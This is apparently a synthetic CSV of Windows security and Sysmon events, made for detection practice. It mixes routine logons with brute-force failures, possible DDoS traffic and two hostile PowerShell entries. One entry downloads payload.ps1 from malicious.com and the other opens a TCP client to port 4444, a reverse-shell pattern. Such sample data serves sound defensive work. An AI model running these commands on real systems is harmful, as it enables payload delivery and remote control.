EventID,SystemTime,TargetUserName,IpAddress,WorkstationName,ProcessName,EventDescription,ScriptContent,SourcePort,DestinationPort
4624,2025-05-15T16:29:00.123456,Administrator,127.0.0.1,SRV01,-,Successful Logon (Local),-,-,-
4625,2025-05-15T16:29:01.123456,Administrator,192.168.1.100,ATTACKER-WK01,-,Failed Logon Attempt (Invalid Password),-,-,-
4625,2025-05-15T16:29:01.234567,Administrator,192.168.1.100,ATTACKER-WK01,-,Failed Logon Attempt (Invalid Password),-,-,-
4624,2025-05-15T16:29:01.345678,IEUser,192.168.1.10,WKSTN01,-,Successful Logon (Network),-,-,-
4625,2025-05-15T16:29:01.456789,Guest,172.16.0.50,REMOTE-PC01,-,Failed Logon Attempt (Account Disabled),-,-,-
4625,2025-05-15T16:29:01.567890,TestUser,10.0.2.15,PC01,-,Failed Logon Attempt (Invalid Username),-,-,-
4104,2025-05-15T16:29:10.678901,IEUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Get-Service | Where-Object {$_.Status -eq 'Running'},-,-
1,2025-05-15T16:29:15.789012,IEUser,-,SRV01,C:\Windows\explorer.exe,Sysmon Process Create,C:\Windows\explorer.exe,-,-
4104,2025-05-15T16:29:20.890123,IEUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,Invoke-WebRequest -Uri http://malicious.com/payload.ps1 -OutFile C:\Temp\payload.ps1,-,-
5156,2025-05-15T16:29:30.901234,-,192.168.1.200,BOTNET-PC01,-,Network Connection (Potential DDoS),-,54321,80
5156,2025-05-15T16:29:30.902345,-,192.168.1.200,BOTNET-PC01,-,Network Connection (Potential DDoS),-,54322,80
5156,2025-05-15T16:29:30.903456,-,192.168.1.200,BOTNET-PC01,-,Network Connection (Potential DDoS),-,54323,80
5156,2025-05-15T16:29:30.904567,-,192.168.1.10,WKSTN01,-,Network Connection (HTTP Request),-,54324,80
4625,2025-05-15T16:29:31.012345,Administrator,192.168.1.100,ATTACKER-WK01,-,Failed Logon Attempt (Invalid Password),-,-,-
4624,2025-05-15T16:29:31.123456,LocalUser,192.168.1.20,WKSTN02,-,Successful Logon (Network),-,-,-
4625,2025-05-15T16:29:31.234567,Administrator,203.0.113.10,ATTACKER-WK02,-,Failed Logon Attempt (Invalid Password),-,-,-
4625,2025-05-15T16:29:31.345678,Guest,172.16.0.50,REMOTE-PC01,-,Failed Logon Attempt (Account Disabled),-,-,-
4104,2025-05-15T16:29:35.456789,TestUser,-,SRV01,C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe,PowerShell Script Execution,New-Object System.Net.Sockets.TCPClient('192.168.1.1',4444),-,-
5156,2025-05-15T16:29:40.567890,-,192.168.1.200,BOTNET-PC01,-,Network Connection (Potential DDoS),-,54325,80
